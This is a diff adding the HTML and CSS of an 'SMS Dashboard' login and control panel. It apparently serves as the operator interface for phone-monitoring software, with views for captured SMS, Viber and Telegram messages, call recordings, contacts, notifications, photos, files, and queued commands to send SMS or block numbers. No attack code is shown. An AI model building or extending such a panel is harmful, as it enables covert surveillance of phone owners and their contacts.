@@ -1,0 +1,2400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SMS Dashboard</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0f172a; color: #e2e8f0; min-height: 100vh;
+  }
+  body { padding: 16px; display: flex; align-items: center; justify-content: center; }
+  .container { max-width: 900px; width: 100%; margin: 0 auto; }
+
+  #toastContainer {
+    position: fixed; top: 16px; left: 50%; transform: translateX(-50%);
+    z-index: 9999; display: flex; flex-direction: column; gap: 8px;
+    width: calc(100% - 32px); max-width: 500px; pointer-events: none;
+  }
+  .toast {
+    padding: 12px 16px; border-radius: 10px;
+    font-size: 13px; font-weight: 500; color: white;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+    animation: slideDown 0.3s ease-out;
+    word-wrap: break-word; line-height: 1.4; pointer-events: auto;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .toast svg { flex-shrink: 0; }
+  .toast.error   { background: #dc2626; border-left: 4px solid #fca5a5; }
+  .toast.success { background: #16a34a; border-left: 4px solid #86efac; }
+  .toast.info    { background: #2563eb; border-left: 4px solid #93c5fd; }
+  .toast.warning { background: #d97706; border-left: 4px solid #fcd34d; }
+  @keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+  @keyframes fadeOut { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-20px); } }
+  .toast.hiding { animation: fadeOut 0.3s ease-in forwards; }
+
+  #loginScreen { display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; }
+  .login-box {
+    width: 100%; max-width: 400px; background: #1e293b;
+    padding: 32px; border-radius: 16px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+  .login-box h2 {
+    color: #38bdf8; margin-bottom: 24px;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    font-size: 22px;
+  }
+  .login-box input {
+    width: 100%; padding: 14px 16px; margin-bottom: 16px;
+    background: #0f172a; border: 1px solid #334155;
+    border-radius: 8px; color: #e2e8f0; font-size: 15px;
+  }
+  .login-box input:focus { outline: none; border-color: #38bdf8; }
+  .login-box button {
+    width: 100%; padding: 14px; background: #38bdf8; color: #0f172a;
+    border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
+    cursor: pointer; margin-top: 8px;
+  }
+  .login-box button:disabled { background: #475569; cursor: not-allowed; }
+  .error-msg { color: #f87171; font-size: 14px; margin-top: 12px; text-align: center; min-height: 20px; }
+
+  #loadingScreen { display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; }
+  #loadingScreen svg { animation: spin 1s linear infinite; }
+  @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+  #dashScreen { width: 100%; padding: 16px 0; }
+
+  .header {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 16px; padding: 14px 18px;
+    background: #1e293b; border-radius: 12px; gap: 8px; flex-wrap: wrap;
+  }
+  .header h1 { font-size: 18px; color: #38bdf8; flex: 1; min-width: 150px; display: flex; align-items: center; gap: 8px; }
+  .header-actions { display: flex; gap: 8px; }
+  .refresh-btn {
+    padding: 8px 10px; background: #38bdf8; color: #0f172a;
+    border: none; border-radius: 8px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .refresh-btn:hover { background: #0ea5e9; }
+  .refresh-btn:disabled { background: #475569; cursor: not-allowed; }
+  .refresh-btn.spinning svg { animation: spin 1s linear infinite; }
+
+  .logout-btn {
+    padding: 8px 14px; background: #ef4444; color: white;
+    border: none; border-radius: 8px; cursor: pointer; font-size: 13px;
+    display: flex; align-items: center; gap: 6px; font-weight: 500;
+  }
+  .logout-btn:hover { background: #dc2626; }
+
+  .live-badge {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 3px 8px; background: #065f46; color: #6ee7b7;
+    border-radius: 12px; font-size: 10px; font-weight: 600;
+  }
+  .live-badge.offline { background: #7f1d1d; color: #fca5a5; }
+  .live-badge.connecting { background: #78350f; color: #fcd34d; }
+  .live-badge.cached { background: #164e63; color: #67e8f9; }
+  .live-dot { width: 6px; height: 6px; border-radius: 50%; background: #10b981; animation: pulse 1.5s infinite; }
+  .live-badge.offline .live-dot { background: #ef4444; }
+  .live-badge.connecting .live-dot { background: #f59e0b; }
+  .live-badge.cached .live-dot { background: #06b6d4; }
+  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+  .device-info {
+    background: #1e293b; padding: 14px 16px; border-radius: 10px;
+    margin-bottom: 16px; font-size: 13px; color: #94a3b8; line-height: 1.8;
+  }
+  .device-info strong { color: #e2e8f0; }
+
+  .btn-list { display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; }
+  .tab-btn {
+    width: 100%; padding: 14px 18px; background: #1e293b;
+    border: 1px solid #334155; border-radius: 10px;
+    color: #e2e8f0; font-size: 15px; font-weight: 500;
+    cursor: pointer; display: flex; align-items: center;
+    justify-content: space-between; text-align: left; transition: all 0.2s;
+  }
+  .tab-btn .btn-left { display: flex; align-items: center; gap: 12px; }
+  .tab-btn .tab-icon { width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; }
+  .tab-btn .tab-icon svg { width: 20px; height: 20px; }
+  .tab-btn .arrow { color: #64748b; font-size: 18px; }
+  .tab-btn:hover { background: #293548; border-color: #38bdf8; }
+  .tab-btn.active { background: #38bdf8; color: #0f172a; border-color: #38bdf8; }
+  .tab-btn.active .arrow { color: #0f172a; }
+
+  .btn-right { display: flex; align-items: center; gap: 8px; }
+  .badge {
+    background: #ef4444; color: white; padding: 2px 8px; border-radius: 10px;
+    font-size: 11px; font-weight: 700; min-width: 22px; text-align: center;
+    box-shadow: 0 2px 6px rgba(239,68,68,0.4);
+  }
+  .badge.hidden { display: none; }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  .back-btn {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 8px 14px; background: #1e293b;
+    border: 1px solid #334155; border-radius: 8px;
+    color: #94a3b8; font-size: 13px; cursor: pointer; margin-bottom: 14px;
+  }
+  .back-btn:hover { border-color: #38bdf8; color: #38bdf8; }
+
+  .page-title {
+    font-size: 18px; color: #38bdf8; margin-bottom: 14px; font-weight: 600;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .page-title svg { width: 22px; height: 22px; }
+
+  .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 10px; margin-bottom: 16px; }
+  .stat-card { background: #1e293b; padding: 14px 10px; border-radius: 10px; text-align: center; }
+  .stat-card .num { font-size: 24px; font-weight: 700; color: #38bdf8; }
+  .stat-card .lbl { font-size: 11px; color: #94a3b8; margin-top: 4px; text-transform: uppercase; }
+
+  .form-box { background: #1e293b; border-radius: 12px; padding: 16px; margin-bottom: 16px; border: 1px solid #334155; }
+  .form-box h3 { color: #38bdf8; font-size: 14px; font-weight: 700; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+  .form-box h3 svg { width: 16px; height: 16px; }
+  .form-row { margin-bottom: 12px; }
+  .form-row label {
+    display: block; color: #94a3b8; font-size: 11px;
+    font-weight: 600; text-transform: uppercase;
+    margin-bottom: 6px; letter-spacing: 0.5px;
+  }
+  .form-row input, .form-row textarea {
+    width: 100%; padding: 12px 14px;
+    background: #0f172a; border: 1px solid #334155;
+    border-radius: 8px; color: #e2e8f0; font-size: 14px;
+    font-family: inherit; resize: vertical;
+  }
+  .form-row input:focus, .form-row textarea:focus { outline: none; border-color: #38bdf8; }
+  .form-row textarea { min-height: 80px; }
+
+  .btn-primary {
+    width: 100%; padding: 12px; background: #38bdf8; color: #0f172a;
+    border: none; border-radius: 8px; font-size: 15px; font-weight: 700;
+    cursor: pointer; display: flex; align-items: center;
+    justify-content: center; gap: 8px; transition: all 0.2s;
+  }
+  .btn-primary:hover { background: #0ea5e9; }
+  .btn-primary:disabled { background: #475569; cursor: not-allowed; }
+  .btn-primary svg { width: 16px; height: 16px; }
+  .btn-danger { background: #dc2626; color: white; }
+  .btn-danger:hover { background: #b91c1c; }
+
+  .cmd-item {
+    background: #1e293b; border-radius: 10px; padding: 12px 14px;
+    margin-bottom: 10px; border-left: 3px solid #64748b;
+  }
+  .cmd-item.pending  { border-left-color: #f59e0b; }
+  .cmd-item.sending  { border-left-color: #3b82f6; }
+  .cmd-item.sent     { border-left-color: #22c55e; }
+  .cmd-item.done     { border-left-color: #22c55e; }
+  .cmd-item.failed   { border-left-color: #ef4444; }
+  .cmd-item.blocked  { border-left-color: #8b5cf6; }
+
+  .cmd-top { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 6px; align-items: center; flex-wrap: wrap; }
+  .cmd-type {
+    font-weight: 700; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px;
+    padding: 3px 8px; border-radius: 4px;
+    display: inline-flex; align-items: center; gap: 5px;
+  }
+  .cmd-type svg { width: 12px; height: 12px; }
+  .cmd-type.sms     { background: #1e40af; color: #93c5fd; }
+  .cmd-type.block   { background: #7c2d12; color: #fdba74; }
+  .cmd-type.unblock { background: #14532d; color: #86efac; }
+  .cmd-type.photo   { background: #5b21b6; color: #c4b5fd; }
+  .cmd-type.file    { background: #065f46; color: #6ee7b7; }
+
+  .cmd-status {
+    font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;
+    padding: 2px 7px; border-radius: 4px;
+    display: inline-flex; align-items: center; gap: 4px;
+  }
+  .cmd-status svg { width: 10px; height: 10px; }
+  .cmd-status.pending { background: #78350f; color: #fcd34d; }
+  .cmd-status.sending { background: #1e40af; color: #93c5fd; }
+  .cmd-status.sent    { background: #065f46; color: #6ee7b7; }
+  .cmd-status.done    { background: #065f46; color: #6ee7b7; }
+  .cmd-status.failed  { background: #7f1d1d; color: #fca5a5; }
+  .cmd-status.blocked { background: #4c1d95; color: #c4b5fd; }
+
+  .cmd-phone { color: #38bdf8; font-weight: 700; font-size: 14px; font-family: monospace; margin-bottom: 4px; word-break: break-all; }
+  .cmd-body { color: #cbd5e1; font-size: 13px; line-height: 1.4; padding: 6px 8px; background: #0f172a; border-radius: 6px; word-wrap: break-word; white-space: pre-wrap; margin-bottom: 6px; }
+  .cmd-note { color: #f87171; font-size: 11px; font-style: italic; word-break: break-word; }
+  .cmd-time { color: #64748b; font-size: 10px; font-family: monospace; }
+
+  .blocked-item {
+    background: #1e293b; border-radius: 10px; padding: 12px 14px;
+    margin-bottom: 8px; display: flex; justify-content: space-between;
+    align-items: center; gap: 10px; border-left: 3px solid #8b5cf6;
+  }
+  .blocked-item .b-number { color: #a78bfa; font-weight: 700; font-size: 14px; font-family: monospace; word-break: break-all; flex: 1; }
+  .blocked-item .b-date { color: #64748b; font-size: 10px; margin-top: 2px; }
+
+  .btn-small {
+    padding: 6px 12px; border: none; border-radius: 6px;
+    font-size: 12px; font-weight: 600; cursor: pointer;
+    display: inline-flex; align-items: center; gap: 5px; transition: all 0.2s;
+  }
+  .btn-small svg { width: 12px; height: 12px; }
+  .btn-unblock { background: #16a34a; color: white; }
+  .btn-unblock:hover { background: #15803d; }
+
+  .sms-item {
+    background: #1e293b; border-radius: 10px; padding: 12px 14px;
+    margin-bottom: 10px; border-left: 3px solid #38bdf8;
+  }
+  .sms-item.out { border-left-color: #f59e0b; }
+  .sms-item.viber { border-left-color: #7360f2; }
+  .sms-item.telegram { border-left-color: #2aabee; }
+  .sms-item .top { display: flex; justify-content: space-between; font-size: 11px; color: #94a3b8; margin-bottom: 6px; gap: 8px; }
+  .sms-item .phone { color: #38bdf8; font-weight: 600; font-size: 13px; word-break: break-all; }
+  .sms-item.viber .phone { color: #a78bfa; }
+  .sms-item.telegram .phone { color: #67c8f5; }
+  .sms-item .msg { color: #e2e8f0; font-size: 13px; line-height: 1.5; word-wrap: break-word; white-space: pre-wrap; }
+  .sms-item .dir-badge { display: inline-block; padding: 2px 7px; border-radius: 4px; font-size: 10px; font-weight: 600; margin-right: 5px; }
+  .dir-in { background: #16a34a; color: white; }
+  .dir-out { background: #f59e0b; color: white; }
+
+  .contact-item {
+    background: #1e293b; border-radius: 10px; padding: 12px 14px;
+    margin-bottom: 8px; display: flex; justify-content: space-between;
+    align-items: center; gap: 10px; border-left: 3px solid #a855f7;
+  }
+  .contact-item .c-left { flex: 1; min-width: 0; }
+  .contact-item .c-name { color: #e2e8f0; font-weight: 600; font-size: 14px; word-break: break-word; margin-bottom: 2px; }
+  .contact-item .c-count { display: inline-block; background: #7c3aed; color: white; padding: 1px 7px; border-radius: 10px; font-size: 10px; font-weight: 700; margin-left: 6px; }
+  .contact-item .c-number { color: #a855f7; font-size: 13px; word-break: break-all; }
+
+  .call-item { background: #1e293b; border-radius: 10px; padding: 12px 14px; margin-bottom: 8px; border-left: 3px solid #22c55e; }
+  .call-item.outgoing { border-left-color: #38bdf8; }
+  .call-item.missed { border-left-color: #ef4444; }
+  .call-item.rejected { border-left-color: #f59e0b; }
+  .call-item .top { display: flex; justify-content: space-between; font-size: 11px; color: #94a3b8; margin-bottom: 6px; gap: 8px; }
+  .call-item .phone { color: #38bdf8; font-weight: 600; font-size: 13px; word-break: break-all; }
+  .call-item .phone.clickable { cursor: pointer; text-decoration: underline dotted; text-underline-offset: 3px; display: inline-flex; align-items: center; gap: 4px; }
+  .call-item .phone.clickable svg { width: 12px; height: 12px; opacity: 0.7; }
+  .call-item .phone.clickable:hover { color: #0ea5e9; }
+  .call-item .details { font-size: 12px; color: #cbd5e1; }
+  .call-badge { display: inline-block; padding: 2px 7px; border-radius: 4px; font-size: 10px; font-weight: 600; margin-right: 5px; }
+  .badge-incoming { background: #22c55e; color: white; }
+  .badge-outgoing { background: #38bdf8; color: #0f172a; }
+  .badge-missed { background: #ef4444; color: white; }
+  .badge-rejected { background: #f59e0b; color: white; }
+  .badge-unknown { background: #64748b; color: white; }
+
+  .call-audio { margin-top: 10px; padding: 10px; background: #0f172a; border-radius: 8px; border-left: 3px solid #22c55e; }
+  .call-audio.hidden { display: none; }
+  .audio-item { background: #1e293b; border-radius: 8px; padding: 10px; margin-bottom: 8px; }
+  .audio-item:last-child { margin-bottom: 0; }
+  .audio-label { color: #22c55e; font-size: 12px; font-weight: 600; margin-bottom: 6px; word-break: break-all; display: flex; align-items: center; gap: 6px; }
+  .audio-label svg { width: 14px; height: 14px; flex-shrink: 0; }
+  .audio-item audio { height: 36px; width: 100%; }
+  .no-audio { color: #64748b; font-size: 12px; text-align: center; padding: 8px; font-style: italic; display: flex; align-items: center; justify-content: center; gap: 6px; }
+  .no-audio svg { width: 14px; height: 14px; }
+
+  .log-item { background: #1e293b; border-radius: 10px; padding: 12px 14px; margin-bottom: 10px; border-left: 3px solid #ec4899; }
+  .log-item .log-top { display: flex; justify-content: space-between; font-size: 11px; color: #94a3b8; margin-bottom: 6px; gap: 8px; align-items: center; }
+  .log-item .log-app { font-weight: 600; font-size: 13px; color: #ec4899; display: flex; align-items: center; gap: 6px; }
+  .log-item .log-app svg { width: 14px; height: 14px; }
+  .log-item .log-title { color: #fbbf24; font-weight: 600; font-size: 13px; margin-bottom: 4px; word-break: break-word; }
+  .log-item .log-msg { color: #e2e8f0; font-size: 13px; line-height: 1.5; word-wrap: break-word; white-space: pre-wrap; }
+  .log-item .log-pkg { color: #64748b; font-size: 10px; margin-top: 6px; font-family: monospace; word-break: break-all; }
+
+  .placeholder { text-align: center; padding: 50px 20px; color: #94a3b8; background: #1e293b; border-radius: 10px; }
+  .placeholder .icon { margin-bottom: 16px; display: flex; align-items: center; justify-content: center; }
+  .placeholder .icon svg { width: 48px; height: 48px; }
+  .placeholder h3 { color: #e2e8f0; font-size: 18px; margin-bottom: 8px; }
+  .placeholder p { font-size: 13px; line-height: 1.6; }
+
+  .empty-state { text-align: center; padding: 40px 20px; color: #94a3b8; display: flex; flex-direction: column; align-items: center; gap: 12px; }
+  .empty-state svg { width: 42px; height: 42px; opacity: 0.5; }
+
+  .hidden { display: none !important; }
+
+  .info-bar { background: #1e293b; padding: 8px 14px; border-radius: 8px; margin-bottom: 12px; font-size: 12px; color: #38bdf8; text-align: center; }
+
+  .sys-section { background: #1e293b; border-radius: 12px; padding: 14px 16px; margin-bottom: 14px; }
+  .sys-title { color: #38bdf8; font-size: 15px; font-weight: 700; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid #334155; display: flex; align-items: center; gap: 8px; }
+  .sys-title svg { width: 18px; height: 18px; }
+  .sys-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 13px; border-bottom: 1px dashed #334155; }
+  .sys-row:last-child { border-bottom: none; }
+  .sys-key { color: #94a3b8; font-weight: 500; }
+  .sys-val { color: #e2e8f0; font-weight: 600; text-align: right; word-break: break-all; max-width: 60%; }
+
+  .app-tabs { display: flex; gap: 8px; margin-bottom: 12px; }
+  .app-tab-btn {
+    flex: 1; padding: 10px; background: #0f172a; border: 1px solid #334155;
+    border-radius: 8px; color: #94a3b8; font-size: 13px; font-weight: 600;
+    cursor: pointer; transition: all 0.2s;
+    display: flex; align-items: center; justify-content: center; gap: 6px;
+  }
+  .app-tab-btn svg { width: 14px; height: 14px; }
+  .app-tab-btn.active { background: #38bdf8; color: #0f172a; border-color: #38bdf8; }
+
+  .app-list { max-height: 500px; overflow-y: auto; }
+  .app-row { display: flex; justify-content: space-between; padding: 10px 8px; border-bottom: 1px solid #334155; gap: 10px; align-items: center; }
+  .app-row:last-child { border-bottom: none; }
+  .app-info { flex: 1; min-width: 0; }
+  .app-name { color: #e2e8f0; font-weight: 600; font-size: 13px; margin-bottom: 2px; word-break: break-word; }
+  .app-pkg { color: #64748b; font-size: 10px; font-family: monospace; word-break: break-all; }
+  .app-meta { text-align: right; font-size: 10px; color: #94a3b8; line-height: 1.5; flex-shrink: 0; }
+
+  .perm-group { margin-bottom: 12px; padding: 10px 12px; background: #0f172a; border-radius: 8px; border-left: 3px solid #ec4899; }
+  .perm-header { display: flex; justify-content: space-between; margin-bottom: 8px; align-items: center; }
+  .perm-name { color: #ec4899; font-weight: 700; font-size: 13px; }
+  .perm-count { background: #7f1d1d; color: #fca5a5; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; }
+  .perm-item { display: flex; align-items: center; padding: 6px 0; gap: 8px; font-size: 12px; border-bottom: 1px dashed #1e293b; }
+  .perm-item:last-child { border-bottom: none; }
+  .perm-tag { background: #334155; color: #cbd5e1; padding: 1px 5px; border-radius: 3px; font-size: 9px; font-weight: 700; flex-shrink: 0; }
+  .perm-label { color: #e2e8f0; flex: 1; min-width: 0; word-break: break-word; }
+  .perm-pkg { color: #64748b; font-size: 9px; font-family: monospace; text-align: right; word-break: break-all; max-width: 45%; }
+  .perm-empty { color: #64748b; font-size: 12px; padding: 4px 0; font-style: italic; }
+
+  .record-item { background: #1e293b; border-radius: 10px; padding: 14px; margin-bottom: 12px; border-left: 3px solid #22c55e; }
+  .record-top { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 6px; }
+  .record-file { color: #22c55e; font-weight: 600; font-size: 13px; word-break: break-all; display: flex; align-items: center; gap: 6px; }
+  .record-file svg { width: 16px; height: 16px; flex-shrink: 0; }
+  .record-size { color: #94a3b8; font-size: 11px; flex-shrink: 0; }
+  .record-date { color: #64748b; font-size: 11px; margin-bottom: 8px; }
+  .record-download {
+    display: inline-flex; align-items: center; gap: 6px; margin-top: 6px;
+    color: #38bdf8; font-size: 12px; text-decoration: none;
+    padding: 6px 10px; background: #0f172a; border-radius: 6px; border: 1px solid #334155;
+  }
+  .record-download svg { width: 14px; height: 14px; }
+  .record-error { color: #ef4444; font-size: 12px; margin-top: 6px; }
+  audio { height: 40px; }
+
+  .photo-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 6px;
+    margin-bottom: 16px;
+  }
+  .photo-tile {
+    position: relative;
+    aspect-ratio: 1 / 1;
+    background: #1e293b;
+    border-radius: 8px;
+    overflow: hidden;
+    cursor: pointer;
+    border: 2px solid transparent;
+    transition: all 0.2s;
+  }
+  .photo-tile:hover { border-color: #38bdf8; transform: scale(1.02); }
+  .photo-tile img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+  .photo-tile .photo-idx {
+    position: absolute;
+    top: 4px;
+    right: 4px;
+    background: rgba(0,0,0,0.7);
+    color: #38bdf8;
+    font-size: 10px;
+    font-weight: 700;
+    padding: 2px 6px;
+    border-radius: 4px;
+  }
+  .photo-tile .photo-date {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+    color: white;
+    font-size: 9px;
+    padding: 14px 6px 4px;
+    text-align: center;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .load-more-btn {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #7c3aed, #38bdf8);
+    color: white;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transition: all 0.2s;
+    box-shadow: 0 4px 12px rgba(124,58,237,0.4);
+  }
+  .load-more-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(124,58,237,0.6); }
+  .load-more-btn:disabled { background: #475569; cursor: not-allowed; box-shadow: none; transform: none; }
+  .load-more-btn svg { width: 18px; height: 18px; }
+  .load-more-btn.spinning svg { animation: spin 1s linear infinite; }
+
+  .photo-modal {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.95);
+    z-index: 10000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    animation: fadeIn 0.2s;
+  }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  .photo-modal-content {
+    background: #1e293b;
+    border-radius: 12px;
+    max-width: 600px;
+    width: 100%;
+    max-height: 90vh;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    position: relative;
+  }
+  .photo-modal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 16px;
+    border-bottom: 1px solid #334155;
+    gap: 10px;
+  }
+  .photo-modal-title {
+    color: #38bdf8;
+    font-size: 13px;
+    font-weight: 600;
+    flex: 1;
+    word-break: break-all;
+  }
+  .photo-modal-close {
+    background: #ef4444;
+    color: white;
+    border: none;
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  .photo-modal-body {
+    padding: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow-y: auto;
+    flex: 1;
+  }
+  .photo-modal-body img {
+    max-width: 100%;
+    max-height: 60vh;
+    border-radius: 8px;
+    display: block;
+  }
+  .photo-modal-footer {
+    padding: 12px 16px;
+    border-top: 1px solid #334155;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+  .photo-modal-info {
+    color: #94a3b8;
+    font-size: 12px;
+    flex: 1;
+    min-width: 0;
+    line-height: 1.5;
+  }
+  .photo-modal-info strong { color: #e2e8f0; }
+
+  .file-item {
+    background: #1e293b; border-radius: 10px; padding: 12px 14px;
+    margin-bottom: 8px; display: flex; justify-content: space-between;
+    align-items: center; gap: 10px; border-left: 3px solid #10b981;
+  }
+  .file-item.error { border-left-color: #ef4444; }
+  .file-info { flex: 1; min-width: 0; }
+  .file-name {
+    color: #e2e8f0; font-weight: 600; font-size: 13px;
+    word-break: break-all; margin-bottom: 4px;
+  }
+  .file-meta {
+    color: #64748b; font-size: 10px; font-family: monospace;
+    display: flex; gap: 8px; flex-wrap: wrap;
+  }
+  .file-meta .ext {
+    background: #334155; color: #cbd5e1; padding: 1px 6px;
+    border-radius: 3px; font-weight: 700; text-transform: uppercase;
+  }
+  .file-download-btn {
+    background: #10b981; color: white; border: none;
+    padding: 8px 12px; border-radius: 6px; font-size: 12px;
+    font-weight: 600; cursor: pointer; flex-shrink: 0;
+    display: flex; align-items: center; gap: 5px;
+  }
+  .file-download-btn:hover { background: #059669; }
+  .file-download-btn:disabled { background: #475569; cursor: not-allowed; }
+  .file-download-btn svg { width: 12px; height: 12px; }
+  .file-downloaded {
+    background: #065f46; color: #6ee7b7; padding: 6px 10px;
+    border-radius: 6px; font-size: 11px; font-weight: 600;
+    text-decoration: none; display: inline-flex; align-items: center; gap: 5px;
+  }
+  .file-downloaded svg { width: 12px; height: 12px; }
+</style>
+</head>
+<body>
+
+<div id="toastContainer"></div>
+
+<div class="container">
+
+  <div id="loginScreen" class="hidden">
+    <div class="login-box">
+      <h2>
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        SMS Dashboard
+      </h2>
+      <input type="email" id="emailInput" placeholder="Email" autocomplete="off">
+      <input type="password" id="passwordInput" placeholder="Password" autocomplete="new-password">
+      <button id="loginBtn">Login</button>
+      <div class="error-msg" id="loginError"></div>
+    </div>
+  </div>
+
+  <div id="loadingScreen">
+    <div style="text-align:center;color:#94a3b8;">
+      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
+      </svg>
+      <div style="margin-top:12px;font-size:13px;">Loading...</div>
+    </div>
+  </div>
+
+  <div id="dashScreen" class="hidden">
+
+    <div class="header">
+      <h1>
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="3" width="7" height="9" rx="1"/>
+          <rect x="14" y="3" width="7" height="5" rx="1"/>
+          <rect x="14" y="12" width="7" height="9" rx="1"/>
+          <rect x="3" y="16" width="7" height="5" rx="1"/>
+        </svg>
+        Dashboard
+        <span class="live-badge connecting" id="liveBadge"><span class="live-dot"></span>WAIT</span>
+      </h1>
+      <div class="header-actions">
+        <button class="refresh-btn" id="refreshBtn" title="Refresh">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0f172a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M23 4v6h-6M1 20v-6h6"/>
+            <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"/>
+          </svg>
+        </button>
+        <button class="logout-btn" id="logoutBtn">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
+            <polyline points="16 17 21 12 16 7"/>
+            <line x1="21" y1="12" x2="9" y2="12"/>
+          </svg>
+          Logout
+        </button>
+      </div>
+    </div>
+
+    <div class="device-info" id="deviceInfo">
+      <strong>User:</strong> <span id="userEmail">-</span>
+    </div>
+
+    <div id="menuScreen">
+      <div class="btn-list">
+
+        <button class="tab-btn" data-tab="sms">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+                <polyline points="22,6 12,13 2,6"/>
+              </svg>
+            </span>
+            <span>SMS</span>
+          </span>
+          <span class="btn-right">
+            <span class="badge hidden" id="badge-sms">0</span>
+            <span class="arrow">›</span>
+          </span>
+        </button>
+
+        <button class="tab-btn" data-tab="calls">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+              </svg>
+            </span>
+            <span>Calls</span>
+          </span>
+          <span class="btn-right">
+            <span class="badge hidden" id="badge-calls">0</span>
+            <span class="arrow">›</span>
+          </span>
+        </button>
+
+        <button class="tab-btn" data-tab="contacts">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
+                <circle cx="9" cy="7" r="4"/>
+                <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
+                <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+              </svg>
+            </span>
+            <span>Contacts</span>
+          </span>
+          <span class="btn-right">
+            <span class="badge hidden" id="badge-contacts">0</span>
+            <span class="arrow">›</span>
+          </span>
+        </button>
+
